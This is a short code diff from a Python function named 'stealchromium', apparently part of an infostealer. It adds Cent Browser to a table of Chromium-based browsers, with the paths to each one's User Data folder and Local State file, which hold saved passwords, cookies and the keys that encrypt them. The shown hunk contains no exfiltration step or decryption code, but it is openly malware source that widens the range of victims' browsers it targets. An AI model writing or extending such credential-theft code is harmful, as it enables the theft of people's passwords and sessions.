@@ -236,6 +236,7 @@ def stealchromium():
             'Samsung Internet': {'path': localappdata + '\\Samsung\\Internet\\User Data', 'localstate': localappdata + '\\Samsung\\Internet\\User Data\\Local State'},
             'Supermium': {'path': localappdata + '\\Supermium\\User Data', 'localstate': localappdata + '\\Supermium\\User Data\\Local State'},
             'Iridium': {'path': localappdata + '\\Iridium\\User Data', 'localstate': localappdata + '\\Iridium\\User Data\\Local State'},
+            'Cent Browser': {'path': localappdata + '\\CentBrowser\\User Data', 'localstate': localappdata + '\\CentBrowser\\User Data\\Local State'},
             'WaveBrowser': {'path': localappdata + '\\WaveBrowser\\User Data', 'localstate': localappdata + '\\WaveBrowser\\User Data\\Local State'},
             'Helium': {'path': localappdata + '\\imput\\Helium\\User Data', 'localstate': localappdata + '\\imput\\Helium\\User Data\\Local State'},
             'Escosia': {'path': localappdata + '\\EscosiaBrowser\\User Data', 'localstate': localappdata + '\\EscosiaBrowser\\User Data\\Local State'},
